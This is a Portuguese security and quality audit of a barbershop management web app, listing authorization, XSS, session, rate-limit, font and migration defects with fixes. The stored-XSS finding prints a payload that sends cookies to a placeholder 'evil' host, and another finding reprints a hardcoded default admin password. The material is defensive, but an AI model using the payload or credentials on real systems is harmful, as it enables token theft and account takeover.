# Auditoria Técnica, de Design, de Escrita e de LGPD — Barber-Select

**Repositório:** https://github.com/AlanMarskerman/Barber-Select/tree/dev
**Branch auditada:** `dev` — commit `994fd3d` (13/11/2026, AlanMarskerman)
**Data da auditoria:** 13 de novembro de 2026
**Metodologia:** leitura integral do código (≈19.000 linhas), execução real da aplicação (Node 26 + Chromium via Playwright MCP), sondagem ativa da API com `curl` (36 requisições autenticadas e não autenticadas), inspeção de design automatizada (`taste-skill` `lint.mjs` + `inspect.mjs` em Chromium real a 1440/768/390 px), base de conhecimento de UX (`ui-ux-pro-max`), calibração de design (`frontend-design`) e revisão de copy (`professional-business-writing`).

> **Nota de ambiente:** o MySQL não estava disponível na máquina de auditoria. Isso turned out útil: expôs que **todas** as rotas de dados travam e devolvem `500` quando o banco cai, em vez de degradar com clareza. Todos os achados marcados como **"confirmado em runtime"** foram reproduzidos no servidor real.

> **🔎 Versão revisada.** Cada achado foi reconferido contra o código do zip enviado (`Barber-Select-dev`) e, quando possível, em runtime (servidor Node com `.env` de teste, **sem MySQL**). Itens marcados com **🔎 Correção da revisão** foram ajustados. Resumo: **retirado** 8.14 (grafia "Collaborador" não existe; o código diz "Colaborador"); **rebaixados/qualificados** P0-05, P0-07, P1-01, P1-04, P1-05, P1-06, P2-01, P3-04, P3-09 e X-02 (docs); **contagens corrigidas** (14 rotas sem RBAC, 16 `onclick`); **pacote vulnerável** é `proxy-addr`. Não verificados aqui: medições de design em navegador (D-01 a D-04), análise jurídica da LGPD, histórico do git (X-22) e o 400 do Google Fonts (P0-04, sem acesso de rede).

---

## 📊 1. Resumo executivo

| Pilar | Nota | Status | Veredito em uma frase |
|---|:---:|:---:|---|
| **Segurança & Autorização (RBAC)** | **2.5 / 10** | 🔴 Crítico | 14 rotas de dados (financeiro, vendas, estoque, agenda) aceitam **qualquer usuário autenticado**, inclusive `client`. Um cliente lê o caixa da barbearia. |
| **XSS & Higiene de Frontend** | **4.0 / 10** | 🔴 Crítico | 7 cópias de `escapeHtml`, nenhuma escaping de aspas → *attribute breakout*; **XSS armazenado vivo** em `sales.status`. |
| **Rate limit & anti-brute-force** | **2.0 / 10** | 🔴 Crítico | O limiter de login é **completamente inerte** contra `X-Forwarded-For` forjado (13 tentativas, zero 429). O lockout é um **DoS não autenticado** que bloqueia a vítima **com a senha correta**. |
| **Funcionalidade (app quebra em produção)** | **3.5 / 10** | 🔴 Crítico | A CSP do helmet bloqueia **todos** os `<script>` inline e **todos** os `onclick`. 9 das 12 telas de produto estão com a lógica principal desligada. |
| **Sessão & Autenticação (cliente)** | **4.0 / 10** | 🔴 Crítico | Corrida de *refresh token* força logout a cada 15 min; 10 chamadas usam `fetch` cru e perdem o auto-refresh; logout do cliente **não revoga** no servidor; a blacklist **ressuscita** tokens revogados. |
| **Web Fonts** | **3.0 / 10** | 🔴 Crítico | A URL do Google Fonts tem um eixo `opsz` inválido. O DM Sans **nunca carrega** em nenhuma das 12 páginas que o pedem. |
| **Integridade do caixa** | **3.5 / 10** | 🔴 Crítico | Concluir → reverter → concluir **duplica a receita**; o `service_price` é **definido pelo cliente**; `DELETE` deixa lançamentos órfãos. A agenda e o caixa divergem permanentemente. |
| **Conformidade LGPD** | **2.0 / 10** | 🔴 Crítico | Sem política de privacidade, sem encarregado, sem base legal, sem registro de operações, transferência internacional via CDN, anonimização incompleta e exportação que **vaza o histórico de outra pessoa**. |
| **Integridade de dados** | **5.0 / 10** | 🟠 Alto | Sem *unique constraint*, sem validação de estoque/preço, *upsert* destrutivo, `NaN` contorna a validação de valor e `||` inventa dados. |
| **Arquitetura & Código** | **5.5 / 10** | 🟡 Regular | Duas implementações da página de clientes brigando pelo mesmo DOM; 13 sidebars duplicados; ~1.300 linhas de CSS duplicado; zero testes, lint e CI. |
| **Design & UI/UX** | **6.5 / 10** | 🟡 Regular | Identidade verde/dourado forte, mas 14 falhas medidas pelo inspetor, tokens conflitantes em 4 `:root` e 301 px de overflow no mobile. |
| **Escrita & Copy** | **5.0 / 10** | 🟡 Regular | 11 verbos para a mesma ação, 5 nomes para "agendamento", 4 para "colaborador", "Staff" ao lado de "Colaborador" e boxicons/Google em PT-BR. |
| **Documentação & DX** | **3.5 / 10** | 🔴 Crítico | **Não existe README.md.** Guia de uso exclusivo para Windows/PowerShell. Relatório de auditoria anterior superestima o risco residual. |

**Veredito:** a base é melhor do que a nota sugere — estrutura de módulos, *prepared statements* consistentes, hash falso contra *timing attack*, `escapeHtml` presente, tratamento de 401 com refresh automático, proteção do último admin e separação de tipo de token são trabalho sério. Mas o projeto **não pode ir para produção hoje**: **nove** defeitos (RBAC, limiter inerte, XSS armazenado, corrida de refresh, integridade do caixa, web font, migração MySQL, LGPD, blacklist que ressuscita tokens) quebram funcionalidades, expõem dados entre perfis ou permitem fraude no caixa.

**Esforço total para sair do vermelho:** ~3 semanas de 1 pessoa (Fase 1 + 2 do §10).

> 📌 **Quer que o agente refaça essa auditoria sozinho?** A **§7** traz os comandos para instalar as skills de design/escrita/code-review, os MCPs (Playwright + context-mode), o `.mcp.json` versionado, o `.claude/settings.json` com as permissões e o playbook de `CLAUDE.md` que faz o Claude Code rodar exatamente este roteiro — incluindo o slash command `/auditar`.

---

## 🚨 2. P0 — Bloqueadores de produção

### [P0-01] 🔴 14 rotas sem restrição de perfil: qualquer `client` lê o caixa da barbearia

**Arquivos:** `features/financeiro-mysql/finance-routes.js:26,61,98` · `features/vendas-mysql/sales-routes.js:41,66,132` · `features/produtos-mysql/products-routes.js:27,57,91,117` · `features/agenda-mysql/appointments-routes.js:48,88,164,221`

Todas usam `authenticate()` **sem argumentos** — autenticam o usuário mas **não verificam o perfil**:

```js
// features/financeiro-mysql/finance-routes.js:26
router.get("/", authenticate(), async (req, res) => { ... });   // ← qualquer role
// features/agenda-mysql/appointments-routes.js:88
router.post("/", authenticate(), async (req, res) => { ... });  // ← qualquer role
```

Contraste com o que já é feito corretamente no mesmo código-base:

```js
// features/clientes-mysql/clients-routes.js:85
router.get("/", authenticate(STAFF_ROLES), async (req, res) => { ... });   // ✅ staff + admin
const STAFF_ROLES = ["staff", "admin"];   // ✅ clients-routes.js
```

**Confirmado em runtime** (servidor real, token `client` válido):

```
CLIENT GET /api/finance        → 500  {"error":"Erro interno ao listar transações financeiras."}
CLIENT GET /api/sales          → 500  {"error":"Erro interno ao listar vendas."}
CLIENT GET /api/products       → 500  {"error":"Erro interno ao listar produtos."}
CLIENT GET /api/appointments   → 500  {"error":"Erro interno ao listar agendamentos."}
CLIENT GET /api/clients        → 403  {"error":"Você não tem permissão para esta ação."}   ← só esta está protegida
```

O `500` (e não `403`) é a prova: o pedido **passou pela autorização** e só quebrou depois, no acesso ao banco. Com o MySQL no ar, o mesmo `client` recebe o JSON completo.

**Impacto real:**
- `GET /api/finance` → **livro-razão inteiro** da barbearia (entradas, saídas, valores).
- `GET /api/appointments` → **agenda completa**, com `client_name` e `client_phone` de **todos** os clientes. Isso é vazamento de dado pessoal de terceiro, não só do próprio usuário.
- `POST /api/finance` / `POST /api/sales` → o cliente **cria lançamentos financeiros**. Um `POST` falso de R$ 5.000,00 falseado no caixa é um problema contábil e de confiança.
- `POST /api/appointments` → o cliente cria agendamentos em nome de outros.
- `DELETE /api/sales/:id`, `DELETE /api/finance/:id` → apaga registros de venda e transação.

**Correção:**

```js
// features/financeiro-mysql/finance-routes.js
const STAFF_ROLES = ["staff", "admin"];

router.get("/",      authenticate(STAFF_ROLES), async (req, res) => { ... });
router.post("/",     authenticate(STAFF_ROLES), async (req, res) => { ... });
router.delete("/:id", authenticate(STAFF_ROLES), async (req, res) => { ... });
```

E, para `appointments`, **duas regras diferentes** porque cliente e equipe usam a mesma rota:

```js
// features/agenda-mysql/appointments-routes.js
const STAFF_ROLES = ["staff", "admin"];

// GET: staff vê a agenda inteira; cliente vê só a própria
router.get("/", authenticate(), async (req, res) => {
  const isStaff = STAFF_ROLES.includes(req.user.role);
  const sql = isStaff
    ? "SELECT * FROM appointments WHERE appointment_date BETWEEN ? AND ?"
    : "SELECT * FROM appointments WHERE client_email = ? AND appointment_date BETWEEN ? AND ?";
  // ...
});

// POST: staff cria para quem quiser; cliente cria só para si
router.post("/", authenticate(), async (req, res) => {
  if (!STAFF_ROLES.includes(req.user.role)) {
    req.body.client_id = req.user.userId;      // ignora o que o cliente mandou
    req.body.client_email = req.user.identity;
  }
  // ...
});

// PUT/DELETE: só staff
router.put("/:id/status", authenticate(STAFF_ROLES), async (req, res) => { ... });
router.delete("/:id",       authenticate(STAFF_ROLES), async (req, res) => { ... });
```

> **🔎 Correção da revisão:** o exemplo de `GET`/`POST` acima usa a coluna `client_email`, que **não existe** em `appointments` (colunas: `client_id`, `client_name`, `client_phone`…), e `client_id` é `INT` (id de `clients`), não o `userId` hexadecimal do token. Para filtrar pelo cliente logado, busque o `id` em `clients` pelo e-mail (`req.user.identity`) e use-o em `client_id`. Contagem real: 14 rotas (finance 3, sales 3, products 4, appointments 4).

> **Recomendação:** extraia a constante para um módulo único (`features/auth/roles.js`) — hoje `STAFF_ROLES` só existe em `clients-routes.js`, e as demais rotas não têm referência alguma ao conceito.

---

### [P0-02] 🔴 A CSP do helmet bloqueia toda a lógica inline do produto

**Arquivo:** `server.js:63` (`app.use(helmet())`) · consumidores em `public/client/*.html`, `public/staff/*.html`

O helmet v8 aplica por padrão `script-src 'self'` e `script-src-attr 'none'`. O projeto usa extensivamente `<script>` inline e atributos `onclick`. O navegador **bloqueia tudo** e registra o erro no console — silenciosamente, sem erro visível para o usuário.

**Confirmado em runtime** (Chromium, servidor real):

```
[ERROR] Executing inline script violates the following Content Security Policy
        directive 'script-src 'self''. ... The action has been blocked.
        @ http://localhost:3399/client/home.html:575

[ERROR] Executing inline event handler violates the following Content Security Policy
        directive 'script-src-attr 'none''. ... The action has been blocked.
```

**O que está quebrado agora:**

| Arquivo | Quebrado | Efeito |
|---|---|---|
| `public/client/home.html:575` | `<script>` inline | Bloco principal: saudação (`Olá, {nome}`), carga da lista de agendamentos, botão sair. A tela mostra literalmente `Olá, Cliente` e **0 agendamentos**, com o token válido. |
| `public/client/home.html:451` | `onclick` | `onclick` bloqueado, **mas o Sair funciona**: `client-app.js` (carregado nas 4 páginas) liga um listener que chama `logout()` (modal + `/auth/logout`). |
| `public/client/profile.html:397` | `onclick` | `onclick` bloqueado, **mas o Sair funciona**: `client-app.js` (carregado nas 4 páginas) liga um listener que chama `logout()` (modal + `/auth/logout`). |
| `public/client/request.html:337` | `onclick` | `onclick` bloqueado, **mas o Sair funciona**: `client-app.js` (carregado nas 4 páginas) liga um listener que chama `logout()` (modal + `/auth/logout`). |
| `public/client/settings.html:367` | `onclick` | `onclick` bloqueado, **mas o Sair funciona**: `client-app.js` (carregado nas 4 páginas) liga um listener que chama `logout()` (modal + `/auth/logout`). |
| `public/client/settings.html:470` | `onclick` | Botão de exclusão de dados abre `alert()` em vez de chamar a API. |
| `public/staff/dashboard.html:641,648,655,662` | `onclick` | Os 4 atalhos "Acesso rápido" (Agenda, Clientes, Serviços, Venda) não navegam. |
| `public/staff/venda.html:566` | `onclick` | **Excluir venda** não funciona. |
| `public/staff/produtos.html:547` | `onclick` | **Excluir produto** não funciona. |
| `public/staff/finance.html:561` | `onclick` | **Excluir transação** não funciona. |
| `public/staff/clients.html:411` | `onclick` | **Ativar/inativar cliente** não funciona. |
| `public/staff/agenda.html:821,824` | `onclick` | **Confirmar/concluir** e **excluir agendamento** não funcionam. |
| `public/js/staff/staff-app.js:292` | `onclick` injetado | Botão "ver detalhes" do cliente não funciona. |

**Total: 16 `onclick` + 9 `<script>` inline = 25 blocos bloqueados.** Isso inclui botões de **exclusão de dados e de caixa** — o botão que o dono clica para apagar uma venda.

**Correção — remova os handlers inline (não relaxe a CSP):**

```html
<!-- ❌ antes -->
<button class="btn-action" title="Excluir Venda" onclick="deleteSale(42)">Excluir</button>

<!-- ✅ depois -->
<button class="btn-action" type="button" title="Excluir venda" data-action="delete-sale" data-id="42">
  Excluir
</button>
```

```js
// public/js/staff/staff-app.js
document.addEventListener("click", async (event) => {
  const button = event.target.closest("[data-action]");
  if (!button) return;
  if (button.dataset.action === "delete-sale") {
    await deleteSale(Number(button.dataset.id));
  }
});
```

Para os `<script>` inline, mova o corpo para um arquivo `.js` e referencie com `src` — ou, se a página realmente precisar de script inline, use nonce:

```js
// server.js
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});
app.use((req, res, next) => {
  helmet({
    contentSecurityPolicy: {
      directives: {
        scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
        scriptSrcAttr: ["'none'"],
      },
    },
  })(req, res, next);
});
```

**Recomendação:** remover os inline handlers é o caminho certo. A CSP está fazendo o trabalho dela — só que o código nunca foi adaptado a ela.

---

### [P0-03] 🔴 Corrida de *refresh token* causa logout forçado a cada 15 minutos

**Arquivo:** `public/js/core/shared.js:71-104` + `public/js/core/shared.js:38-68` + `server.js:466-487`

O servidor faz **rotação de refresh token** com semântica de uso único:

```js
// server.js:466-471
const userSession = activeSessions.get(decoded.userId);
if (!userSession || userSession.refreshToken !== refreshToken) {
  return res.status(401).json({ error: "Sessão inválida ou refresh token não corresponde." });
}
// server.js:487
userSession.refreshToken = newRefreshToken;   // o token antigo é invalidado
```

O cliente, porém, **não serializa** as renovações:

```js
// shared.js:83-100
if (response.status === 401) {
  const refreshed = await refreshAccessToken();     // ← sem trava de execução única
  if (refreshed) { /* retry */ }
  else {
    clearSession();
    redirectToLogin();                              // ← desloga o usuário
    return null;
  }
}
```

E o painel de staff dispara **várias** requisições em paralelo no carregamento:

```js
// staff-app.js:211  loadClients()
// staff-app.js:221  loadServices()
// staff-app.js:229  loadBarbers()
```

**Cenário:** o access token expira (TTL de 15 min, `server.js:130`). As 3 requisições paralelas recebem `401` ao mesmo tempo. As 3 chamam `refreshAccessToken()` com o **mesmo** refresh token antigo. A primeira rotaciona com sucesso; a 2ª e a 3ª recebem `401` (o token já mudou) → `refreshAccessToken()` retorna `false` → **`clearSession()` + redirect**.

O pior: a chamada que falha pode *vencer* a corrida e executar `clearSession()` **depois** do refresh bem-sucedido, apagando o token novo que acabou de ser gravado.

**Resultado:** qualquer usuário que deixa a aba aberta por 15 minutos é **expulso para o login** ao recarregar, mesmo com refresh token perfectly válido.

**Correção — trava de execução única (*single-flight*):**

```js
// shared.js
let _refreshPromise = null;

async function refreshAccessToken() {
  if (_refreshPromise) return _refreshPromise;          // ← todos os chamadores compartilham UMA requisição
  _refreshPromise = (async () => {
    const { refreshToken } = getSession();
    if (!refreshToken) return false;
    try {
      const response = await fetch("/auth/refresh", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ refreshToken }),
      });
      if (!response.ok) return false;
      const data = await response.json();
      sessionStorage.setItem("accessToken", data.accessToken);
      if (data.refreshToken) sessionStorage.setItem("refreshToken", data.refreshToken);
      return true;
    } catch (error) {
      console.error("Erro ao renovar token:", error);
      return false;
    } finally {
      _refreshPromise = null;                            // ← libera para a PRÓXIMA expiração
    }
  })();
  return _refreshPromise;
}
```

E, antes de limpar a sessão, confirme que **ninguém mais** renovou:

```js
const staleToken = accessToken;
const refreshed = await refreshAccessToken();
if (!refreshed) {
  if (getSession().accessToken === staleToken) {        // ← ninguém renovou enquanto isso
    clearSession();
    redirectToLogin();
  }
  return null;
}
```

**Complemento:** renove **proativamente**, em vez de reagir ao `401` — o campo `expiresIn` já vem do servidor (`server.js:492`) e nunca é lido:

```js
// auth-manager.js — saveSession
sessionStorage.setItem("expiresAt", String(Date.now() + (data.expiresIn ?? 900) * 1000));

// shared.js
setInterval(() => {
  const exp = Number(sessionStorage.getItem("expiresAt") || 0);
  if (exp && Date.now() > exp - 60_000 && getSession().refreshToken) {
    refreshAccessToken();
  }
}, 30_000);
```

---

### [P0-04] 🔴 A DM Sans nunca carrega — 12 páginas com tipografia de fallback

**Arquivos:** `public/index.html:26`, `public/pages/login.html:20`, `public/client/{home,profile,request,settings}.html`, `public/staff/{dashboard,agenda,clients,products,finance,venda}.html`

A URL do Google Fonts está assim:

```
https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..405,400;...
```

O eixo `opsz` (tamanho óptico) da DM Sans vai de `9` a `40`. O valor `9..405` é **inválido**, e o Google Fonts **descarta a família inteira** em vez de devolver erro.

**Confirmado em runtime** (curl direto à API do Google):

```
$ curl -s "https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..405,400;..."
→ HTTP 400 Bad Request

$ curl -s "https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;..."
→ HTTP 200,  @font-face de "DM Sans" presentes
```

E no navegador, o `Document.fonts` confirma:

```js
[...document.fonts].map(f => f.family + ":" + f.status)
// → ["boxicons:loaded", "Playfair Display:loaded", ... ]   ← DM Sans AUSENTE
getComputedStyle(document.querySelector(".hero-description")).fontFamily
// → "DM Sans", system-ui, -apple-system, sans-serif   (declarada, nunca carregada)
```

**Efeito:** as 12 páginas que declaram DM Sans renderizam no fallback do sistema — o que na auditoria virou uma fonte monoespaçada, e em máquinas de usuários finais vira Arial/Helvetica. A identidade tipográfica (a serif Playfair + a sans geométrica) **não existe** em 12 das 13 telas do produto. Só o `styles.css` (dashboard) importa a Inter via `@import` no CSS e por isso escapa.

**Correção (uma linha, 12 arquivos):**

```
- family=DM+Sans:ital,opsz,wght@0,9..405,400;0,9..405,500;0,9..405,700;1,9..405,400
+ family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,700;1,9..40,400
```

**Correção definitiva (e resolve a LGPD junto):** **self-host** as fontes em `public/fonts/` com `@font-face` + `font-display: swap`. Isso elimina a dependência de CDN third-party, a transferência internacional de IP (§6.5), o risco de indisponibilidade e o *layout shift*. Veja §6.5.

---

### [P0-05] 🔴 `ALTER TABLE ... ADD COLUMN IF NOT EXISTS` não existe no MySQL

> **🔎 Correção da revisão:** `ADD COLUMN IF NOT EXISTS` **não existe no MySQL**, mas **existe no MariaDB** (o MySQL do XAMPP, citado em `db.js`, é MariaDB). O bug é real em MySQL puro/gerenciado; em XAMPP as colunas são criadas. Severidade depende do banco de produção. O `staff-table.js` já usa `SHOW COLUMNS` (correto), e `ensureClientColumns` já é memoizada.

**Arquivo:** `features/clientes-mysql/clients-routes.js` (função `ensureClientColumns`, linhas 15-23)

```js
const colsToAddToClients = [
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS active TINYINT(1) NOT NULL DEFAULT 1",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS birthdate DATE NULL",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS cpf VARCHAR(20) NULL",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS fav_barber VARCHAR(50) NULL",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS hair_style VARCHAR(100) NULL",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS beard_style VARCHAR(100) NULL",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS skin_notes VARCHAR(300) NULL",
  "ALTER TABLE clients ADD COLUMN IF NOT EXISTS loyalty_points INT NOT NULL DEFAULT 12"
];

for (const sql of colsToAddToClients) {
  try {
    await pool.query(sql);
  } catch (e) {
    // Ignora se a coluna já existir ou falha de versão do ALTER TABLE ADD COLUMN IF NOT EXISTS
  }
}
```

`ADD COLUMN IF NOT EXISTS` é sintaxe do **MariaDB**, não do MySQL. O projeto usa MySQL (`features/cadastro-mysql/db.js` → `mysql2/promise`; schemas com sintaxe MySQL). No MySQL cada `ALTER` gera **erro de sintaxe**, que o `catch` engole em silêncio.

**Consequência:** as 8 colunas **nunca são criadas**. E o `schema.sql` da tabela `clients` só define 7 (`id, name, email, phone, password_hash, active, created_at`) — **nenhuma** delas é `birthdate`, `cpf`, `fav_barber`, `hair_style`, `beard_style`, `skin_notes` ou `loyalty_points`.

Ao mesmo tempo, as consultas do próprio arquivo **dependem** dessas colunas:

```js
// clients-routes.js:91 — GET /api/clients
"SELECT id, name, email, phone, birthdate, cpf, fav_barber, hair_style, beard_style, skin_notes, loyalty_points, active, created_at FROM clients ORDER BY created_at DESC, id DESC LIMIT ?"

// clients-routes.js:188 — GET /api/clients/me/export
"SELECT * FROM clients WHERE email = ? LIMIT 1"   →  SELECT * não quebra, mas o UPDATE abaixo quebra:
```

```js
// clients-routes.js — PUT /api/clients/me
"UPDATE clients SET name = ?, phone = ?, birthdate = ?, cpf = ?, fav_barber = ?, hair_style = ?, beard_style = ?, skin_notes = ? WHERE email = ?"
// → ER_BAD_FIELD_ERROR: Unknown column 'birthdate' in 'field list'  →  500
```

E a anonimização LGPD (§6.5) também usa `cpf`/`birthdate`/`skin_notes` → **quebra junto**.

Ou seja: **em qualquer MySQL real, o perfil do cliente, a exportação LGPD e a anonimização estão quebrados** — e o erro é engolido por um `catch` vazio com comentário de dupicidade.

**Correção — migração idempotente e visível:**

```js
// features/cadastro-mysql/db.js
const CLIENT_MIGRATIONS = [
  ["birthdate",   "ALTER TABLE clients ADD COLUMN birthdate DATE NULL"],
  ["cpf",         "ALTER TABLE clients ADD COLUMN cpf VARCHAR(20) NULL"],
  ["fav_barber",  "ALTER TABLE clients ADD COLUMN fav_barber VARCHAR(50) NULL"],
  ["hair_style",  "ALTER TABLE clients ADD COLUMN hair_style VARCHAR(100) NULL"],
  ["beard_style", "ALTER TABLE clients ADD COLUMN beard_style VARCHAR(100) NULL"],
  ["skin_notes",  "ALTER TABLE clients ADD COLUMN skin_notes VARCHAR(300) NULL"],
  ["loyalty_points", "ALTER TABLE clients ADD COLUMN loyalty_points INT NOT NULL DEFAULT 0"],
];

async function migrateClients(pool) {
  const [existing] = await pool.query("SHOW COLUMNS FROM clients");
  const names = new Set(existing.map((c) => c.Field));
  for (const [column, sql] of CLIENT_MIGRATIONS) {
    if (names.has(column)) continue;
    try {
      await pool.query(sql);
      console.info(`[migrate] coluna ${column} adicionada`);
    } catch (error) {
      console.error(`[migrate] falha ao adicionar ${column}:`, error.message);
      throw error;   // não engole: erro de migração precisa aparecer
    }
  }
}
```

E **mova o schema para um arquivo de migração versionado** (ver §5.1).

---

### [P0-06] 🔴 Contas administrativas padrão com senha fixa, no código-fonte

**Arquivo:** `features/cadastro-mysql/staff-table.js` (bloco de *seeding*)

```js
const adminHash = await bcrypt.hash("AdminPassword2026!", 10);
const staffHash = await bcrypt.hash("StaffPassword2026!", 10);

await pool.query(
  `INSERT INTO staff_users (name, email, username, phone, password_hash, role, active) VALUES (?, ?, ?, ?, ?, ?, 1)`,
  ["Administrador Master", "admin@barberselect.local", "admin", "11999999999", adminHash, "admin"]
);
```

A tabela `staff_users` é criada e populada automaticamente **na primeira conexão**, com e-mail `admin@barberselect.local` e senha `AdminPassword2026!` — **publicada no repositório GitHub e documentada em `CREDENCIAIS-DEBUG.md`**. O `staff_users` também é a origem do `userId` de todos os admins.

**Impacto:** qualquer pessoa que clonar o repositório conhece as credenciais de administrador. Se o banco for implantado sem trocar a senha, a instalação está comprometida antes do primeiro login.

**Correção:**

```js
// 1. Só semear se explicitamente solicitado (ambiente de desenvolvimento)
const ALLOW_SEED = process.env.ALLOW_DEFAULT_SEED === "true";

if (ALLOW_SEED && Number(rows[0].total) === 0) {
  const password = process.env.SEED_ADMIN_PASSWORD;
  if (!password) throw new Error("Defina SEED_ADMIN_PASSWORD para semear contas padrão.");
  const adminHash = await bcrypt.hash(password, 10);
  // ...
}

// 2. Em produção, o primeiro admin é criado por comando explícito, com senha
//    aleatória impressa uma única vez no console do servidor.
```

E remova a senha do `CREDENCIAIS-DEBUG.md` — troque por um template (`CREDENCIAIS-DEBUG.md.example`) só com placeholders, e adicione `CREDENCIAIS-DEBUG.md` ao `.gitignore`.

---

### [P0-07] 🔴 XSS armazenado vivo em `sales.status`

> **🔎 Correção da revisão:** o sink sem escape (`venda.html:564`) e a falta de whitelist são reais. Porém a CSP atual do helmet (`script-src 'self'; script-src-attr 'none'`) bloqueia `onerror`/`onmouseover` inline, então hoje é **injeção de HTML**, não execução de script. Vira XSS pleno se a CSP for afrouxada (`unsafe-inline`). Além disso o app não usa cookies: os tokens ficam em `sessionStorage`, não em `document.cookie`.

**Arquivo:** `public/staff/venda.html:564` (sink) · `features/vendas-mysql/sales-routes.js:85` (fonte)

```js
// venda.html:563-564  ← o payment_method é escapado, o status NÃO
<td><span class="pill ${isPago ? 'pago' : 'pendente'}">${s.status}</span></td>
```

**Por que é live, não teórico:** o schema de `sales` usa **texto livre**, não ENUM:

```sql
-- features/vendas-mysql/schema.sql
status VARCHAR(30) NOT NULL DEFAULT 'Pago'
```

E o caminho de escrita **não valida nada**:

```js
// features/vendas-mysql/sales-routes.js:85
const saleStatus = status || "Pago";      // ← sem whitelist, sem limite de tamanho
// :91
`INSERT INTO sales (client_name, item_name, amount, payment_method, status, sale_date) VALUES (?, ?, ?, ?, ?, ?)`
```

Compare com `features/financeiro-mysql/schema.sql:6` (`type ENUM('entrada','saida')`) e com `features/agenda-mysql/appointments-routes.js:175` (`if (!validStatuses.includes(status))` — **whitelist validada**). `sales.status` é o único status em texto livre **e** o único renderizado sem escape.

**Caminho de ataque:**
1. Qualquer `staff`/`admin` chama `POST /api/sales` com `{"status":"<img src=x onerror=fetch('//evil/'+document.cookie)>", ...}`.
2. O servidor grava verbatim.
3. Todo staff que abre `/staff/venda.html` executa — e `document.cookie` / `sessionStorage['accessToken']` estão ao alcance, então o atacante **coleta os JWTs dos outros admins**.

**Correção (defesa em profundidade — faça as duas):**

```js
// venda.html:564
<td><span class="pill ${isPago ? 'pago' : 'pendente'}">${escapeHtml(s.status)}</span></td>
```

```js
// features/vendas-mysql/sales-routes.js — espelhar a whitelist de appointments
const VALID_SALE_STATUS = ["Pago", "Pendente"];
const saleStatus = VALID_SALE_STATUS.includes(status) ? status : "Pago";
```

E endureça o schema: `status ENUM('Pago','Pendente') NOT NULL DEFAULT 'Pago'`.

---

## 🔐 3. P1 — Segurança

### [P1-01] 🔴 `escapeHtml` não escapa aspas → *attribute breakout* (7 cópias)

> **🔎 Correção da revisão:** mesmo ponto do P0-07: a CSP atual bloqueia handlers inline injetados, então a exploração de script está mitigada; o defeito (6 cópias inline + `staff-app.js`, nenhuma escapando `"` e `'`) é real e deve ser corrigido como defesa em profundidade.

**Arquivos:** `public/js/staff/staff-app.js:698-702` (definição) · `public/staff/{agenda,clients,venda,produtos,finance}.html` · `public/client/home.html` · `public/js/staff/clients-page.js`

```js
// staff-app.js:698-702
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;              // ← escapa & < > mas NÃO " nem '
}
```

**Por que importa:** o resultado é interpolado dentro de um **atributo HTML**:

```js
// staff-app.js:443
aria-label="Editar ${escapeHtml(service.name)}"     // ← aspa não escapada
```

Um serviço chamado `x" onmouseover="alert(1)` produz:

```html
aria-label="Editar x" onmouseover="alert(1)" title="Editar"
```

→ **injeção de atributo → XSS.** Nomes de serviço são controlados por qualquer `staff`/`admin` via `POST /api/services` (a validação em `features/servicos-mysql/services-routes.js:72-74` só checa *tamanho*, não caracteres).

**Pior: existem 7 cópias do controle de segurança**, e a **melhor delas nunca é carregada**:

| Variante | Onde | Escapa `& < >` | Escapa `" '` | Usa `textContent` |
|---|---|:---:|:---:|:---:|
| A | `staff-app.js:698` | ✅ | ❌ | ❌ |
| B | `agenda.html:846`, `clients.html:420`, `venda.html:585`, `produtos.html:566`, `finance.html:590`, `client/home.html:636` | ✅ | ❌ | ❌ |
| C | `js/staff/clients-page.js` | — | — | ✅ **usa `document.createElement` + `textContent`** |

`clients-page.js` é o arquivo **mais bem escrito do repositório** (constrói DOM, nunca usa `innerHTML` para dados de API, e documenta o rationale no cabeçalho: *"Todo texto vindo da API entra na tela com textContent (nunca innerHTML)"*) — e **nenhuma página o carrega** (verificado: `clients-page.js` aparece apenas no próprio comentário de cabeçalho).

**Correção — uma única implementação:**

```js
// public/js/core/shared.js — nova fonte única da verdade
const ESCAPE_MAP = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
window.escapeHtml = (value) => String(value ?? "").replace(/[&<>"']/g, (c) => ESCAPE_MAP[c]);
```

E **adote `clients-page.js`** como modelo, deletando o bloco inline de `staff/clients.html:349-449` e o duplicado em `staff-app.js:258-308`.

---

### [P1-02] 🔴 `trust proxy: 1` + `proxy-addr` vulnerável → rate limit contornável

> **🔎 Correção da revisão:** o pacote vulnerável reportado pelo `npm audit` é `proxy-addr` (GHSA-jqcg-44mw-7w3h, crítico), não "proxy-concurrency". O bypass por `X-Forwarded-For` foi reproduzido (13 tentativas, zero 429) quando o app é acessado diretamente; atrás de um proxy que sobrescreve o header o risco cai.

**Arquivo:** `server.js:23`

```js
app.set("trust proxy", 1);
```

`npm audit` reporta **`proxy-addr` com vulnerabilidade CRÍTICA (bypass de IP via IPv4-mapped IPv6)** na cadeia do `express-rate-limit` v8.7.0. Como o `express-rate-limit` v8 constrói a chave por `req.ip`, a combinação permite que um atacante **envie `X-Forwarded-For` falsificado** para trocar o bucket de rate limit a cada requisição.

**Impacto:** o limite de 10 logins / 15 min (`server.js:68-76`) e o de 20 cadastros (`client-auth.js`) ficam sem efeito real contra *credential stuffing*.

```
$ npm audit
proxy-addr  → CRITICAL  (IP spoofing via trust subnet)
body-parser        → HIGH      (DoS via trailing bytes em corpo comprimido)
ip-address         → moderate
qs                 → moderate
```

**Correção:**

```js
// Se existe exatamente UM proxy reverso (Nginx, Cloudflare) na frente:
app.set("trust proxy", 1);

// Mais seguro — não confiar em XFF diretamente:
app.set("trust proxy", (ip) => {
